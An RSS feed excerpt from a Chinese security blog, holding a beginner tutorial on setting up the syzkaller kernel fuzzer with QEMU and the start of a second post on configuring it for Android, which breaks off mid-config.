<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>二进制安全 on ykikoqAq</title><link>https://ykiko.top/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/</link><description>Recent content in 二进制安全 on ykikoqAq</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Fri, 10 Apr 2020 00:00:00 +0800</lastBuildDate><atom:link href="https://ykiko.top/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml"/><item><title>syzkaller_fuzzing_入门</title><link>https://ykiko.top/p/syzkaller_fuzzing_%E5%85%A5%E9%97%A8/</link><pubDate>Fri, 10 Apr 2020 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/syzkaller_fuzzing_%E5%85%A5%E9%97%A8/</guid><description>&lt;h1 id="syzkaller_fuzzing_入门">syzkaller_fuzzing_入门&lt;/h1>
&lt;h3 id="0x00-介绍">0x00 介绍&lt;/h3>
&lt;p>&lt;a class="link" href="https://github.com/google/syzkaller" target="_blank" rel="noopener"
>syzkaller&lt;/a>是google的安全研究人员开发并维护的内核fuzz工具。它主要是用go写的，也有少部分C代码，支持akaros/fuchsia/linux/android/freebsd/netbsd/openbsd/windows等系统，发现的漏洞多达上千。&lt;/p>
&lt;h3 id="0x01-环境配置">0x01 环境配置&lt;/h3>
&lt;p>&lt;strong>环境要求&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>
&lt;p>C/C++ 编译器&lt;/p>
&lt;ul>
&lt;li>GCC 6.1.0+&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>linux kernel&lt;/p>
&lt;ul>
&lt;li>
&lt;p>编译 v4.6以后编译时确保&lt;code>CONFIG_KCOV=y&lt;/code> 之前版本：&lt;a class="link" href="https://github.com/torvalds/linux/commit/5c9a8750a6409c63a0f01d51a9024861022f6593" target="_blank" rel="noopener"
>这样&lt;/a>添加支持&lt;/p>
&lt;/li>
&lt;li>
&lt;p>一些额外&lt;a class="link" href="https://github.com/google/syzkaller/blob/master/docs/linux/kernel_configs.md" target="_blank" rel="noopener"
>选项&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>VM 一般QEMU&lt;/p>
&lt;ul>
&lt;li>
&lt;p>支持QEMU、kvmtool和GCE虚拟机、Android设备和Odroid C2开发板&lt;/p>
&lt;/li>
&lt;li>
&lt;p>需要进行通信：vm要提供网络支持&lt;/p>
&lt;/li>
&lt;li>
&lt;p>vm配置需要ssh服务器&lt;/p>
&lt;/li>
&lt;li>
&lt;p>要能执行&lt;code>ssh -i $SSHID -p $PORT root@localhost&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>需要将&lt;code>debugfs&lt;/code> 挂在到 &lt;code>/sys/kernel/debug&lt;/code>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://golang.org/" target="_blank" rel="noopener"
>Golang&lt;/a> 安装&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">wget https://dl.google.com/go/go1.14.1.linux-amd64.tar.gz
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tar -C ~/goroot -xzf go1.14.1.linux-amd64.tar.gz
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vim /etc/profile
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mkdir /usr/local/gopath
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 添加export &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">GOROOT&lt;/span>&lt;span class="o">=&lt;/span>/home/kuekiko/goroot
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">GOPATH&lt;/span>&lt;span class="o">=&lt;/span>/home/kuekiko/gopath
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">PATH&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$GOROOT&lt;/span>/bin:&lt;span class="nv">$PATH&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">PATH&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$GOPATH&lt;/span>/bin:&lt;span class="nv">$PATH&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">source&lt;/span> etc/profile
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;li>
&lt;p>syzkaller&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># build&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">go get -u -d github.com/google/syzkaller/...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> &lt;span class="nv">$GOROOT&lt;/span>/src/github.com/google/syzkaller/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make -j4
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># build之后在bin/下&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>如果要cross-OS/arch 进行测试的话，记得修改&lt;code>TARGETOS&lt;/code>, &lt;code>TARGETVMARCH&lt;/code> 和&lt;code>TARGETARCH&lt;/code>参数再&lt;code>make&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="0x02-init-syzkaller">0x02 Init syzkaller&lt;/h3>
&lt;p>生成镜像&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">sudo apt install debootstrap
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> gopath/src/github.com/google/syzkaller/tools/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 使用国内源 修改create-image.sh&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo debootstrap --include&lt;span class="o">=&lt;/span>&lt;span class="nv">$PREINSTALL_PKGS&lt;/span> --components&lt;span class="o">=&lt;/span>main,contrib,non-free &lt;span class="nv">$RELEASE&lt;/span> &lt;span class="nv">$DIR&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 改成&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo debootstrap --include&lt;span class="o">=&lt;/span>&lt;span class="nv">$PREINSTALL_PKGS&lt;/span> --components&lt;span class="o">=&lt;/span>main,contrib,non-free &lt;span class="nv">$RELEASE&lt;/span> &lt;span class="nv">$DIR&lt;/span> http://mirrors.163.com/debian/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./create-image.sh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 选项 --distribution wheezy --feature full&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 生成了stretch.id_rsa stretch.id_rsa.pub stretch.img&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="编译启动-内核">编译启动 内核&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">KERNEL&lt;/span>&lt;span class="o">=&lt;/span>/home/kuekiko/linux_kernel
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">IMG&lt;/span>&lt;span class="o">=&lt;/span>/home/kuekiko/linux_kernel/img
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">PATH&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$KERNEL&lt;/span>:&lt;span class="nv">$PATH&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">PATH&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$IMG&lt;/span>:&lt;span class="nv">$PATH&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 默认编译&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> &lt;span class="nv">$KERNEL&lt;/span>/xxx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make &lt;span class="nv">CC&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$GCC&lt;/span>&lt;span class="s2">/bin/gcc&amp;#34;&lt;/span> defconfig
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make &lt;span class="nv">CC&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$GCC&lt;/span>&lt;span class="s2">/bin/gcc&amp;#34;&lt;/span> kvmconfig
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 直接 make menuconfig &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 编辑.config&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">CONFIG_KCOV&lt;/span>&lt;span class="o">=&lt;/span>y
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">CONFIG_DEBUG_INFO&lt;/span>&lt;span class="o">=&lt;/span>y
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">CONFIG_KASAN&lt;/span>&lt;span class="o">=&lt;/span>y
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">CONFIG_KASAN_INLINE&lt;/span>&lt;span class="o">=&lt;/span>y
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 新&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">CONFIG_CONFIGFS_FS&lt;/span>&lt;span class="o">=&lt;/span>y
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">CONFIG_SECURITYFS&lt;/span>&lt;span class="o">=&lt;/span>y
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make &lt;span class="nv">CC&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$GCC&lt;/span>&lt;span class="s2">/bin/gcc&amp;#34;&lt;/span> olddefconfig
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">make &lt;span class="nv">CC&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$GCC&lt;/span>&lt;span class="s2">/bin/gcc&amp;#34;&lt;/span> -j4
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="qemu">qemu&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">qemu-system-x86_64 &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -kernel &lt;span class="nv">$KERNEL&lt;/span>/arch/x86/boot/bzImage &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -append &lt;span class="s2">&amp;#34;console=ttyS0 root=/dev/sda earlyprintk=serial&amp;#34;&lt;/span>&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -hda &lt;span class="nv">$IMAGE&lt;/span>/stretch.img &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -net user,hostfwd&lt;span class="o">=&lt;/span>tcp::10021-:22 -net nic &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -enable-kvm &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -nographic &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -m 2G &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -smp &lt;span class="m">2&lt;/span> &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> -pidfile vm.pid &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> 2&amp;gt;&lt;span class="p">&amp;amp;&lt;/span>&lt;span class="m">1&lt;/span> &lt;span class="p">|&lt;/span> tee vm.log
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ssh连接&lt;/p>
&lt;p>&lt;code>ssh -i $IMG/stretch.id_rsa -p 10021 -o &amp;quot;StrictHostKeyChecking no&amp;quot; root@localhost&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200417165654.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>kill qemu 使用&lt;code>kill $(cat vm.pid)&lt;/code>&lt;/p>
&lt;h3 id="0x03-start-fuzzing">0x03 Start Fuzzing&lt;/h3>
&lt;p>添加配置文件my.cfg&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-json" data-lang="json">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;target&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;linux/amd64&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;http&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;127.0.0.1:56741&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;workdir&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;$GOPATH/src/github.com/google/syzkaller/workdir&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;kernel_obj&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;$KERNEL&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;image&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;$IMAGE/stretch.img&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;sshkey&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;$IMAGE/stretch.id_rsa&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;syzkaller&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;$GOPATH/src/github.com/google/syzkaller&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;procs&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;qemu&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;vm&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;count&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;kernel&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;$KERNEL/arch/x86/boot/bzImage&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;cpu&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;mem&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">2048&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>启动fuzzing&lt;/p>
&lt;p>&lt;code>./bin/syz-manager -config=my.cfg&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200417185540.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>浏览器打开http://127.0.0.1:56741/&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200417185612.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>虚拟机性能太垃圾，太慢了 fuzzing半天没也啥crashes。还是得用服务器。&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200417190242.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>挂机了大概3小时，出了几个没啥用的crach。&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200417205533.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="0x04-总结">0x04 总结&lt;/h3>
&lt;p>还有很多选项可以开启，没试。&lt;/p>
&lt;p>看看实现源码，还有就是之后试试Fuzzing Android&lt;/p>
&lt;h3 id="参考">参考&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;a class="link" href="https://github.com/google/syzkaller" target="_blank" rel="noopener"
>https://github.com/google/syzkaller&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://www.freebuf.com/sectool/142969.html" target="_blank" rel="noopener"
>https://www.freebuf.com/sectool/142969.html&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="http://blog.douluodalu.wang/2020/03/22/syz-fuzz%E5%88%9D%E6%8E%A2/" target="_blank" rel="noopener"
>http://blog.douluodalu.wang/2020/03/22/syz-fuzz%E5%88%9D%E6%8E%A2/&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://github.com/google/syzkaller/blob/master/docs/linux/setup.md" target="_blank" rel="noopener"
>https://github.com/google/syzkaller/blob/master/docs/linux/setup.md&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul></description></item><item><title>syzkaller-android</title><link>https://ykiko.top/p/syzkaller-android/</link><pubDate>Sun, 15 Sep 2019 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/syzkaller-android/</guid><description>&lt;h1 id="syzkaller-android">syzkaller-android&lt;/h1>
&lt;h3 id="0x00-前言">0x00 前言&lt;/h3>
&lt;p>介绍使用syzkaller fuzz Android的配置教程。&lt;/p>
&lt;h3 id="0x01-环境">0x01 环境&lt;/h3>
&lt;p>按要安装好环境&lt;/p>
&lt;ul>
&lt;li>
&lt;p>go&lt;/p>
&lt;/li>
&lt;li>
&lt;p>syzkaller&lt;/p>
&lt;/li>
&lt;li>
&lt;p>交叉编译aarch64-linux-android、g++-aarch64-linux-gnu、gcc-arm-linux-gnueabihf、g++-arm-linux-gnueabihf&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="0x02-配置">0x02 配置&lt;/h3>
&lt;p>创建配置文件android.cfg&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-json" data-lang="json">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;target&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;linux/arm64&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// arm
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nt">&amp;#34;http&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;127.0.0.1:56741&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;workdir&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;$GOPATH/src/github.com/google/syzkaller/workdir&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;kernel_obj&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;$KERNEL&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// 内核路径
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nt">&amp;#34;syzkaller&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;$GOPATH/src/github.com/google/syzkaller&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;sandbox&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="err">none&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;procs&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;adb&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
